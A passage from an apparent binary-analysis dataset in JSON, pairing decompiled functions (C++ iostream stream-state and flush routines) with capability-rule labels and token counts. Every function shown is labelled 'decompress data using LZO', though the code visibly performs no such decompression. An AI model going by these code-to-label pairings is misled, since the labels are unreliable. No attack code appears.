        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004894b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 0x10);\n        if ((var_34h & var_38h) == 0xffffffff) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "004895d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004895d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 0x10);\n        if ((var_24h & var_28h) == 0xffffffff) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "004897b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004897b0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.004898e0();\n    if (var_10h != '\\0') {\n        iVar3 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x30))(arg_8h, arg_ch);\n        if (arg_ch != iVar3) {\n            fcn.004bbce0();\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.004bdfd0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.004bbce0(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "004898e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004898e0(uchar *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack24;\n    uint uStack20;\n    \n    *param_1 = 0;\n    iVar1 = *param_2;\n    *(param_1 + 4) = param_2;\n    uVar3 = *(iVar1 + -0xc) + param_2;\n    uVar5 = *(uVar3 + 0x14);\n    if (*(uVar3 + 0x70) != 0) {\n        if (uVar5 != 0) goto code_r0x00489908;\n        fcn.00489400();\n        uVar3 = param_2 + *(*param_2 + -0xc);\n        uVar5 = *(uVar3 + 0x14);\n    }\n    if (uVar5 == 0) {\n        *param_1 = 1;\n        return uVar3;\n    }\ncode_r0x00489908:\n    uVar4 = uVar5 | 4;\n    if (*(uVar3 + 0x78) == 0) {\n        uVar4 = uVar5 | 5;\n    }\n    *(uVar3 + 0x14) = uVar4;\n    if ((*(uVar3 + 0x10) & uVar4) == 0) {\n        return uVar4;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    fcn.004aebe0(iStack24 + 0x6c);\n    fcn.004ba260(iStack24, uStack20);\n    fcn.004aed00();\n    fcn.004bba60(uStack20);\n    piVar2 = *(iStack24 + 0x78);\n    if (piVar2 != NULL) {\n        fcn.004aebe0(piVar2 + 7);\n        (**(*piVar2 + 8))(uStack20);\n        fcn.004aed50(uStack20);\n        fcn.004aed00();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 514
    },
    "00489ab0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00489ab0(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x00489b47;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x00489c13:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x00489c13;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x24))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x00489b47:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1043
    },
    "00489c90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00489c90(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x00489d34;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x00489e03:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x00489e03;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_2ch = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_2ch = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_2ch = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_2ch = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 8))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_2ch, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x00489d34:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1048
    },
    "00489e80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.00489e80(int32_t *param_1, ulong param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0(param_1);\n    if (var_20h == '\\0') goto code_r0x00489f1d;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.004bde60();\ncode_r0x00489ff3:\n        uVar6 = fcn.004bde60();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            fcn.0043a8e0(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004c2e40(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar3 = *(iVar5 + 0x7c);\n            if (piVar3 == NULL) goto code_r0x00489ff3;\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.004512b0();\n                var_34h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar3 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar3 + 0x18))(0x20);\n                    var_34h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar3 + 0x3d);\n                var_34h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar7 = *param_1;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            var_34h = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x1c))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_34h, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x00489f1d:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 1043
    },
    "0048a070": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.0048a070(int32_t *param_1, unkbyte10 param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0(param_1);\n    if (var_20h == '\\0') goto code_r0x0048a107;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.004bde60();\ncode_r0x0048a1d3:\n        uVar6 = fcn.004bde60();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            fcn.0043a8e0(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004c2e40(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar3 = *(iVar5 + 0x7c);\n            if (piVar3 == NULL) goto code_r0x0048a1d3;\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.004512b0();\n                var_2ch = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar3 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar3 + 0x18))(0x20);\n                    var_2ch = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar3 + 0x3d);\n                var_2ch = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar7 = *param_1;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            var_2ch = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x20))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_2ch, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x0048a107:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 1046
    },
    "0048a430": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0048a430(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x0048a4c7;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x0048a593:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0048a593;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x10))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x0048a4c7:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1047
    },
    "0048a610": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0048a610(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x0048a6c4;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x0048a793:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0048a793;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x14))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x0048a6c4:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1075
    },
    "0048aa10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048aa10(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x52be90;\n    *(in_ECX + 0x1e) = 0;\n    iVar3 = *arg_8h;\n    in_ECX[0x1d] = 0;\n    iVar3 = arg_8h + *(iVar3 + -0xc);\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[1] = 0x52bea4;\n    fcn.004ba340(iVar3);\n    fcn.004bba60(in_ECX + 0x1c);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x1d] = uVar2;\n    *(in_ECX + 0x1e) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x79) = uVar1;\n    return;\n}\n",
        "token_count": 356
    },
    "0048aad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048aad0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1d] = 0;\n    *(in_ECX + 0x1e) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    *in_ECX = 0x52be90;\n    in_ECX[1] = 0x52bea4;\n    fcn.004bbb80(arg_8h);\n    return;\n}\n",
        "token_count": 181
    },
    "0048abc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0048abc0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1d] = 0;\n    *(param_1 + 0x1e) = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    *param_1 = 0x52be90;\n    param_1[1] = 0x52bea4;\n    fcn.004bbb80(0);\n    return;\n}\n",
        "token_count": 172
    },
    "0048ae80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048ae80(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uchar var_11h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.004898e0();\n    if (var_10h == '\\0') {\n        if (arg_8h != 0) goto code_r0x0048aed8;\n        uVar3 = 1;\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    else {\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        if (arg_8h == 0) {\n            uVar3 = 1;\n        }\n        else {\n            iVar4 = fcn.004be420(arg_8h, *(iVar4 + 0x78), &var_11h);\n            if (iVar4 != 0) goto code_r0x0048aed8;\n            uVar3 = 4;\n            iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        }\n    }\n    fcn.004bbce0(uVar3 | *(iVar4 + 0x14));\ncode_r0x0048aed8:\n    piVar1 = var_ch;\n    iVar4 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.004bdfd0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bbce0(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "0048b020": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0048b020(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x0048a2e7;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x0048a3b3:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) 